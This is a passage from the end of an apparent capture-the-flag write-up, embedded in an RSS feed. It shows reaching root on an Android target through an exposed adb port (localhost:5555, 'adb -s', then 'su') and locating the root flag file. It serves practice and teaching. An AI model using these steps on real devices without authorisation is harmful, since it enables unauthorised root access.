</span></span><span class="line"><span class="cl">explore › adb devices
</span></span><span class="line"><span class="cl">List of devices attached
</span></span><span class="line"><span class="cl">localhost:5555  device
</span></span></code></pre></div><p>But it when I want to get a shell, it returns with</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">explore › adb shell
</span></span><span class="line"><span class="cl">error: more than one device/emulator
</span></span></code></pre></div><p>and that can be resolved by specifying the device with <code>-s</code> option.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">explore › adb devices
</span></span><span class="line"><span class="cl">List of devices attached
</span></span><span class="line"><span class="cl">emulator-5554   device
</span></span><span class="line"><span class="cl">localhost:5555  device
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">explore › adb -s localhost:5555 shell
</span></span><span class="line"><span class="cl">x86_64:/ $ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>2000<span class="o">(</span>shell<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>2000<span class="o">(</span>shell<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>2000<span class="o">(</span>shell<span class="o">)</span>,1004<span class="o">(</span>input<span class="o">)</span>,1007<span class="o">(</span>log<span class="o">)</span>,1011<span class="o">(</span>adb<span class="o">)</span>,1015<span class="o">(</span>sdcard_rw<span class="o">)</span>,1028<span class="o">(</span>sdcard_r<span class="o">)</span>,3001<span class="o">(</span>net_bt_admin<span class="o">)</span>,3002<span class="o">(</span>net_bt<span class="o">)</span>,3003<span class="o">(</span>inet<span class="o">)</span>,3006<span class="o">(</span>net_bw_stats<span class="o">)</span>,3009<span class="o">(</span>readproc<span class="o">)</span>,3011<span class="o">(</span>uhid<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>u:r:shell:s0
</span></span></code></pre></div><p>When I type <code>su</code>, I&rsquo;m in the root shell!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">x86_64:/ $ su
</span></span><span class="line"><span class="cl">:/ <span class="c1"># id</span>
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>u:r:su:s0
</span></span></code></pre></div><p>The root flag can be found using the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">:/ <span class="c1"># find / -type f -name &#34;root.txt&#34; 2&gt;/dev/null</span>
</span></span><span class="line"><span class="cl">/data/root.txt
</span></span><span class="line"><span class="cl">:/ <span class="c1"># cat /data/root.txt</span>
</span></span><span class="line"><span class="cl">f04fc...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://developer.android.com/studio/command-line/adb">https://developer.android.com/studio/command-line/adb</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://stackoverflow.com/questions/57588643/how-to-detect-whether-the-device-is-rooted-or-not">https://stackoverflow.com/questions/57588643/how-to-detect-whether-the-device-is-rooted-or-not</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
